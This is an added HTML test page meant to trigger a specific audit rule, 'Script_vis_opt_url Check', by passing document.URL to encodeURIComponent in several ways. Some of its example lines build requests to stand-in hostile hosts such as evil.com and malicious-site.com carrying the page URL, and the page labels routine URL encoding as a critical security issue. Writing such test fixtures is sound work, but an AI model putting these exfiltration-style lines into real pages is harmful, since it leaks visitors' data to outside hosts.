@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script type="text/javascript">
+        // This should trigger the Script_vis_opt_url Check failure
+        // Direct usage of document.URL in encodeURIComponent without validation
+        var unsafeUrl = document.URL;
+        var encodedUnsafeUrl = encodeURIComponent(unsafeUrl);
+        
+        // Another problematic pattern - using d.URL directly
+        var d = document;
+        var directUrl = d.URL;
+        var encodedDirectUrl = encodeURIComponent(directUrl);
+        
+        // Sending URL to external service without sanitization
+        var trackingUrl = 'https://malicious-site.com/track?url=' + encodeURIComponent(document.URL);
+        
+        // VWO-like script with problematic URL usage
+        window._vwo_code || (function() {
+            var account_id = 1112801;
+            var version = 2.1;
+            var f = false, w = window, d = document;
+            
+            var code = {
+                init: function() {
+                    // This line should trigger the audit failure
+                    var trackingEndpoint = 'https://dev.visualwebsiteoptimizer.com/j.php?a=' + account_id + '&u=' + encodeURIComponent(d.URL) + '&vn=' + version;
+                    
+                    // Additional problematic URL usage
+                    var anotherEndpoint = 'https://analytics.example.com/track?page=' + encodeURIComponent(document.URL);
+                    
+                    // Using window.location.href directly
+                    var locationUrl = 'https://tracker.com/log?ref=' + encodeURIComponent(window.location.href);
+                    
+                    console.log('Problematic URLs:', trackingEndpoint, anotherEndpoint, locationUrl);
+                }
+            };
+            
+            w._vwo_code = code;
+            code.init();
+        })();
+        
+        // More direct problematic patterns
+        function triggerUrlAuditFailure() {
+            // Pattern 1: Direct document.URL usage
+            var url1 = encodeURIComponent(document.URL);
+            
+            // Pattern 2: Direct d.URL usage  
+            var d = document;
+            var url2 = encodeURIComponent(d.URL);
+            
+            // Pattern 3: window.location.href usage
+            var url3 = encodeURIComponent(window.location.href);
+            
+            // Pattern 4: window.location usage
+            var url4 = encodeURIComponent(window.location);
+            
+            // Pattern 5: Using URL in XSS-prone context
+            var script = document.createElement('script');
+            script.src = 'https://evil.com/steal?data=' + encodeURIComponent(document.URL);
+            
+            // Pattern 6: URL in eval context (extremely dangerous)
+            var evalString = 'var stolenUrl = "' + encodeURIComponent(document.URL) + '";';
+            
+            console.log('All problematic URL encodings:', url1, url2, url3, url4);
+        }
+        
+        // Execute immediately to ensure audit catches it
+        triggerUrlAuditFailure();
+        
+        // Also execute on page load
+        window.addEventListener('load', triggerUrlAuditFailure);
+        
+        // Execute with setTimeout to catch async issues
+        setTimeout(triggerUrlAuditFailure, 100);
+        setTimeout(triggerUrlAuditFailure, 1000);
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Script vis_opt_url Check FAIL - Multiple Patterns</title>
+    
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
+        .header { background: linear-gradient(135deg, #dc3545 0%, #c82333 100%); color: white; padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 30px; }
+        .header h1 { margin: 0 0 10px 0; }
+        .test-section { background: white; padding: 20px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .test-section h2 { color: #dc3545; margin-top: 0; border-bottom: 2px solid #dc3545; padding-bottom: 10px; }
+        .test-item { margin: 15px 0; padding: 15px; background: #f8f9fa; border-radius: 5px; border-left: 4px solid #dc3545; }
+        .status { display: inline-block; padding: 5px 10px; border-radius: 15px; font-size: 12px; font-weight: bold; margin: 5px 0; }
+        .status.fail { background: #f8d7da; color: #721c24; }
+        .warning { background: #fff3cd; color: #856404; padding: 15px; border-radius: 5px; border-left: 4px solid #ffc107; margin: 20px 0; }
+        .code-block { background: #f8f9fa; padding: 10px; border-radius: 5px; font-family: monospace; margin: 10px 0; border-left: 3px solid #dc3545; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🔴 Script vis_opt_url Check FAIL Test</h1>
+        <p>Multiple patterns to trigger the "Script_vis_opt_url Check" audit failure</p>
+    </div>
+
+    <div class="warning">
+        <strong>⚠️ CRITICAL SECURITY ISSUES:</strong> This page contains multiple patterns that should trigger the "Script_vis_opt_url Check" audit to fail. All URL usage is unsafe and should be flagged.
+    </div>
+
+    <div class="test-section">
+        <h2>Problematic URL Usage Patterns</h2>
+        <div class="test-item">
+            <p><strong>Pattern 1:</strong> Direct document.URL in encodeURIComponent</p>
+            <div class="code-block">var url = encodeURIComponent(document.URL);</div>
+            <p><strong>Status:</strong> <span class="status fail">SHOULD FAIL</span></p>
+        </div>
+        
+        <div class="test-item">
+            <p><strong>Pattern 2:</strong> Direct d.URL in encodeURIComponent</p>
+            <div class="code-block">var d = document; var url = encodeURIComponent(d.URL);</div>
+            <p><strong>Status:</strong> <span class="status fail">SHOULD FAIL</span></p>
+        </div>
+        
+        <div class="test-item">
+            <p><strong>Pattern 3:</strong> window.location.href in encodeURIComponent</p>
+            <div class="code-block">var url = encodeURIComponent(window.location.href);</div>
+            <p><strong>Status:</strong> <span class="status fail">SHOULD FAIL</span></p>
+        </div>
+        
+        <div class="test-item">
+            <p><strong>Pattern 4:</strong> URL in external service calls</p>
+            <div class="code-block">var endpoint = 'https://evil.com/track?url=' + encodeURIComponent(document.URL);</div>
+            <p><strong>Status:</strong> <span class="status fail">SHOULD FAIL</span></p>
+        </div>
+        
+        <div class="test-item">
+            <p><strong>Pattern 5:</strong> VWO-style tracking with d.URL</p>
+            <div class="code-block">var trackingUrl = 'https://dev.visualwebsiteoptimizer.com/j.php?a=' + account_id + '&u=' + encodeURIComponent(d.URL) + '&vn=' + version;</div>
+            <p><strong>Status:</strong> <span class="status fail">SHOULD FAIL</span></p>
+        </div>
+    </div>
+
+    <div class="test-section">
+        <h2>Expected Audit Results</h2>
+        <div class="test-item">
+            <p><strong>Audit Name:</strong> Script_vis_opt_url Check</p>
+            <p><strong>Expected Level:</strong> Major</p>
+            <p><strong>Expected Status:</strong> <span class="status fail">FAIL</span></p>
+            <p><strong>Expected Message:</strong> "Using d.URL/document.URL directly in encodeURIComponent (Fail)"</p>
+            <p><strong>Fix:</strong> Sanitize and validate URLs before encoding</p>
+        </div>
+    </div>
+
+    <script>
+        // Additional immediate execution to ensure audit catches it
+        (function() {
+            // More problematic patterns
+            var patterns = [
+                'encodeURIComponent(document.URL)',
+                'encodeURIComponent(d.URL)', 
+                'encodeURIComponent(window.location.href)',
+                'encodeURIComponent(window.location)'
+            ];
+            
+            patterns.forEach(function(pattern) {
+                try {
+                    eval('var result = ' + pattern);
+                    console.log('Executed problematic pattern:', pattern, result);
+                } catch(e) {
+                    console.log('Pattern failed:', pattern, e);
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
